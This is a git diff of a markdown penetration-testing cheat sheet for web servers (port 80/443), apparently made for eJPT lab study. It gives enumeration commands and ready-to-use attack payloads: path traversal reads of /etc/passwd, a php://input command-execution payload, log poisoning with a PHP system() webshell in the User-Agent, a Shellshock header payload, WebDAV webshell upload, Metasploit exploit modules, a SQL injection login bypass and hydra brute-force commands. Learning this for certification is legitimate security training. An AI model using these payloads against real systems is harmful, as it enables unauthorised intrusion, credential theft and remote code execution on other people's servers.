@@ -227,61 +227,99 @@ hydra  -L <user_file> -P <password_file> smtp://<target_ip> -s 587 -m AUTH=LOGIN
 
 [Back to Index](#quick-index)
 
-USE: Enumerate dirs/CMS/WebDAV; test LFI/RFI/command injection; apply service-specific exploits.
-TAGS: http, https, gobuster, wpscan, webdav, lfi, rfi, shellshock, hydra
+USE: Enumerate web technologies, directories, and application-specific vulnerabilities (CMS, LFI, RCE); exploit misconfigurations or known CVEs.
+TAGS: http, https, web, whatweb, gobuster, wpscan, lfi, rce, shellshock, webdav, hydra
 
-### Scan
-
-```bash
-nmap -sV -p 80,443 --script=http-* <target_ip>
-```
-
-### File/Directory Enumeration
+### Primary Triage
 
 ```bash
-gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -x php,txt,git,cgi,pl,sh
+nmap -sV -p 80,443 --script=http-title,http-headers,http-server-header,http-methods,http-security-headers,http-robots.txt,http-enum <target_ip>
+
+whatweb -v -a <target_ip>
+
+gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,sh,cgi
 ```
+> Use web browser to view and observe the website is also cirtical to help find potential attack vectors
 
-- Web Reconnaissance Quick Checklist
-  - After running Gobuster, manually inspect the following common files and directories (key sources of information within the eJPT practice lab):
-    - robots.txt: Examine the `Disallow:` entries, which typically point to hidden administrative pages.
-    - wp-config.php/wp-config.bak: Often contain plaintext database credentials.
-    - phpinfo.php: Leaks detailed PHP configuration and server variables.
+### Enumeration
 
-### CMS Scan
+- If WordPress is detected, run a WordPress scan
 
-```bash
-wpscan --url http://<target_ip> --enumerate u,p,t,vp
-```
+    ```bash
+    wpscan --url http://<target_ip> --enumerate u,p,t,vp
+    ```
+    - Options reference:
+        - `--url <URL>`: Target URL
+        - `--enumerate p`: Enumerate popular plugins
+        - `--enumerate ap`: Enumerate all plugins (takes considerable time)
+        - `--enumerate t`: Enumerate popular themes
+        - `--enumerate at`: Enumerate all themes
+        - `--enumerate vp`: Enumerate vulnerable plugins (most commonly used)
 
-- Options reference:
-  - `--url <URL>`: Target URL
-  - `--enumerate p`: Enumerate popular plugins
-  - `--enumerate ap`: Enumerate all plugins (takes considerable time)
-  - `--enumerate t`: Enumerate popular themes
-  - `--enumerate at`: Enumerate all themes
-  - `--enumerate vp`: Enumerate vulnerable plugins (most commonly used)
+- If directory enumeration results contains page with code 401, check if there's HTTP Basic Auth
 
-### WebDAV Enumeration
+    ```bash
+    nmap -p 80,443 --script=http-auth,http-auth-finder <target_ip>
+    ```
 
-```bash
-davtest -url http://<target_ip>/webdav
-```
+- If cgi is identified to be used, verify if it's vulnerable:
 
-### MSF Enumeration
+    ```bash
+    nmap -sV -p 80,443 --script=http-shellshock --script-args uri=<cgi_page> <target_ip>
+    ```
 
-```text
-msf6 > use auxiliary/scanner/http/dir scanner
-msf6 > use auxiliary/scanner/http/http_put
-```
+- If WebDav is identified to be used, do further verification
+
+    ```bash
+    nmap -sV -p 80,443 --script=http-webdav-scan # Confirm that WebDav is enabled
+
+    curl -X OPTIONS http://<target_ip>/webdav # Check options allowed
+
+    davtest -url http://<target_ip>/webdav # Test file upload
+
+    ```
+
+    > Usually, file upload through WebDav requires a valid credential, which might need to conduct brute force attack or find leaked credentials from other places
+
+- If PHP is used, find a .php endpoint with at least one query parameter OR the certain page is dynamic (such as index.php), proceed to parameter discovery:
+    ```bash
+    wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt --hc 404 --hl 100 "http://<target_ip>/<target_php>?FUZZ=test"
+    ```
+    The testing returns usable parameters, such as `page`. Do further testing based on them.
+    1. Test path traversal: Determine if the parameter allows reading arbitrary files.
+      ```bash
+      curl "http://<target_ip>/<target_php>?<parameter>=../../../../etc/passwd" # Linux Based Server
+      curl "http://<target_ip>/<target_php>?=../../../../windows/win.ini"  # Windows Based Server
+      ```
+      - Path Traversal Payload Reference
+        | Target File                           | OS      | Objective                                 |
+| ------------------------------------- | ------- | ----------------------------------------- |
+| /etc/passwd                           | Linux   | User Enumeration & Confirm LFI            |
+| /proc/version                         | Linux   | Kernel & GCC Version Enumeration          |
+| /etc/hosts                            | Linux   | Internal Network Discovery                |
+| C:\Windows\win.ini                    | Windows | Confirm Windows OS & LFI                  |
+| C:\boot.ini                           | Windows | Old Version Windows Initial Configuration |
+| C:\Windows\System32\drivers\etc\hosts | Windows | Internal Network Resolve Record           |
+
+    2. Enumeration for RCE Pre-requisites: Once LFI is confirmed, check for RCE possibilities immediately.
+      - Check allow_url_include via Wrappers. Check if the server allows execution of input streams (quickest RCE).
+        Send a POST request.
+        
+        ```bash
+        curl -X POST -d "<?php system('whoami');?>" "http://<target_ip>/<target_php>?<parameter>=php://input"
+        ```
+
+        If command output is returned, allow_url_include is ON.
+      - Locate Log Files (For Log Poisoning). Attempt to read standard log paths to confirm read access and path location. 
+
+      ```bash
+      curl "http://<target_ip>/index.php?page=../../../../var/log/apache2/access.log" # Debian/Ubuntu Apache
+      curl "http://<target_ip>/index.php?page=../../../../var/log/httpd/access_log" # CentOS/RHEL Apache
+      curl "http://192.168.1.105/index.php?page=../../../../var/log/access.log" # Lgecy versiosn Apache
+      curl "http://target/index.php?page=../../../../xampp/apache/logs/access.log" # Windows XAMPP
+      ```
 
 ### Exploitation
-
-- If `auxiliary/scanner/http/http_put` reports "PUT is allowed"
-    ```text
-    msf6 > use exploit/windows/iis/iis_webdav_upload_asp
-    ```
-    Or upload webshells manually
 
 - If Banner = "HTTP File Server 2.3x" 
     ```text
@@ -293,43 +331,75 @@ msf6 > use auxiliary/scanner/http/http_put
     msf6 > use exploit/windows/http/badblue_passthru
     ```
 
-- If obtain Tomcat Management Credentials
+- If confirm the server is using Tomcat and obtain Tomcat Management Credentials
     ```text
     msf6 > use exploit/multi/http/tomcat_jsp_upload_bypass 
     ```
 
-- If find Local File Inclusion and Remote File Inclusion (reading source code can help identify the vulnerabilities sometime)
-    Use the LFI/RFI & Web Attack Payloads to exploit the site
+- If identified WordPress plugin Duplicator version 1.3.24-1.3.26, run
+    ```text
+    msf6 > use auxiliary/scanner/http/wp_duplicator_file_read
+    ```
 
-- If find `cgi` page and confirm it's vulnerable with `http-shellshock.nse`
-  Use Shellshock Vuln payload to attack
+- If cgi is used and vulerable, 
+    ```bash
+    curl http://<target_ip>/<cgi_page> -H "User-Agent: () { :;}; echo; echo 'Content-Type: text/plain'; echo; /bin/bash -c '<command>'"
+    ```
 
-### LFI/RFI & OS Command Injection Payloads
+- If WebDav allows anonymous file upload, or allow file upload and a valid credential obtained, upload a webshell into it
+    ```bash
+    curl -i -T <webshell_path> http://<target_ip>/webdav -u <username>:<password> 
+    ```
 
-- RCE via GET Payload
-  ```bash
-  curl "http://<target_ip>/<vuln_php_page>?page=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=<command>"
-  ```
-- RCE via POST Payload
-  ```bash
-  curl -X POST "http://<target_ip>/<vuln_php_page>?page=php://input" -H "Content-Type: application/x-www-form-urlencoded" --data-binary "<?php system('<command>'); ?>"
-  ```
+- If XODA 0.4.5 identified and the OS is linux/Unix, run
+    ```text
+    msf6 > use exploit/unix/webapp/xoda_file_upload
+    ```
 
-- Shellshock Vuln Payload
-  ```bash
-  `curl http://<target_ip>/<cgi_page> -H "User-Agent: () { :;}; echo; echo 'Content-Type: text/plain'; echo; /bin/bash -c '<command>'`
-  ```
+- If Tomcat is identified (get a banner or open port is 8080), run
+    ```text
+    msf6 > use auxiliary/scanner/http/tomcat_mgr_login # Brute force
+    msf6 > use exploit/multi/http/tomcat_jsp_upload_bypass # Need creds
+    ```
+
+- If a directory allowing uploading identified, try uploading webshell and execute it manually
+
+- If RCE entry point identified, 
+  1. Vector 1: PHP Wrappers (If allow_url_include=On)
+    ```bash
+    curl -X POST -d "<?php system('whoami');?>" "http://<target_ip>/<target_php>?<parameter>=php://input"
+    ```
+  2. Vector 2: Log Poisoning (If Wrapper fails) 
+    Inject PHP code into a log file (via User-Agent) and include the log file to execute it.
+    - Poisoning Phase: Send a request with a malicious User-Agent. Do NOT inject into the URL to avoid URL-encoding issues.
+      ```bash
+      curl -A "<?php system(\$_GET['cmd']);?>" http://<target_ip>/<target_php>
+      ```
+    - Execution Phase: Include the log file and pass the command.
+      ```text
+      http://<target_ip>/<target_php>?<parameter>=../../../../var/log/apache2/access.log&cmd=id
+      ```
 
 ### Brute Force
 
+- If a login page is identified:
+  1. Try default credentials.
+  2. Try SQL Injection to bypass authentication.
+    ```text
+    ' OR '1'='1
+    ```
+  3. Conduct a brute-force attack:
 ```bash
-hydra -l admin -P rockyou.txt <TARGET_IP> http-post-form \"/login.php:username=^USER^&password=^PASS^:F=<failed_message>"
+hydra -L <username_file> -P <password_file> <target_ip> http-post-form \"/login.php:username=^USER^&password=^PASS^:F=<failed_message>" # Brute Force Login Page
+
+hydra -L <username_file> -P <password_file> <target_ip> http-get <auth_path> # Brute Force HTTP Basic Auth
 ```
 
 - Parameter Description
     - `username` and `password` is the value name defined by web application, and they can be various in different website, e.g. some sites use `user` and `password`.
     -  `^USER^` and `^PASS^`: Hydra placeholders.
     - `F=<failed_message>`: `F=` specifies the distinctive string returned on the page following a failed login.
+
 
 ## Port 139/445: SMB
 
